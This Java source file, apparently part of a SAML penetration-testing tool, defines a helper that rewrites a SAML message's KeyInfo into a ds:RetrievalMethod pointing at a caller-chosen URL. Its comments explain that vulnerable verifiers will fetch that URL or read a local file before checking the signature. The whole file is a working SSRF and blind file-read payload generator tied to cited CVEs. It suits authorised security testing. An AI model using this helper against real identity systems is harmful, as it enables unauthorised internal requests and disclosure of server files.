package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// SSRF / blind file-read via XML Signature KeyInfo dereferencing.
///
/// When an SP's signature verification library resolves <ds:RetrievalMethod URI="...">
/// to fetch key material, it will issue an outbound HTTP request (or, if the URI is
/// a file:// scheme, read a local file) before the signature is validated. An SP
/// that dereferences attacker-controlled URIs during verification leaks an SSRF /
/// file-read primitive — and since resolution happens pre-validation, the attack
/// does not require a valid signature.
///
/// This helper replaces the contents of the first KeyInfo element with a single
/// RetrievalMethod pointing at the supplied URL. The original X509Data is dropped,
/// so the verifier is forced down the retrieval path.
///
/// Links:
/// * CVE-2021-40690 (Apache Santuario XMLSec):  https://nvd.nist.gov/vuln/detail/CVE-2021-40690
/// * CVE-2022-21497 (Oracle Access Manager):    https://nvd.nist.gov/vuln/detail/CVE-2022-21497
/// * XML Signature Syntax (RetrievalMethod):    https://www.w3.org/TR/xmldsig-core1/#sec-RetrievalMethod
public class KeyInfoSSRF {

    private static final String DS_NS = "http://www.w3.org/2000/09/xmldsig#";
    private static final String X509_DATA_TYPE = "http://www.w3.org/2000/09/xmldsig#X509Data";

    /// Replaces the first KeyInfo's children with a RetrievalMethod pointing
    /// at the supplied URL. Preserves the existing namespace prefix on KeyInfo
    /// (typically "ds") so the serialized document remains self-consistent.
    public static String apply(String samlMessage, String retrievalUrl)
            throws SAXException, IOException {
        if (retrievalUrl == null || retrievalUrl.isBlank()) {
            throw new IllegalArgumentException("Retrieval URL must not be empty.");
        }

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList keyInfos = document.getElementsByTagNameNS("*", "KeyInfo");
        if (keyInfos.getLength() == 0) {
            throw new IllegalArgumentException("No KeyInfo element found in SAML message.");
        }

        Element keyInfo = (Element) keyInfos.item(0);
        while (keyInfo.hasChildNodes()) {
            keyInfo.removeChild(keyInfo.getFirstChild());
        }

        String prefix = keyInfo.getPrefix();
        String qname = (prefix == null || prefix.isEmpty())
                ? "RetrievalMethod"
                : prefix + ":RetrievalMethod";

        Element retrieval = document.createElementNS(DS_NS, qname);
        retrieval.setAttribute("URI", retrievalUrl);
        retrieval.setAttribute("Type", X509_DATA_TYPE);
        keyInfo.appendChild(retrieval);

        return xmlHelpers.getString(document);
    }

    private KeyInfoSSRF() {}
}
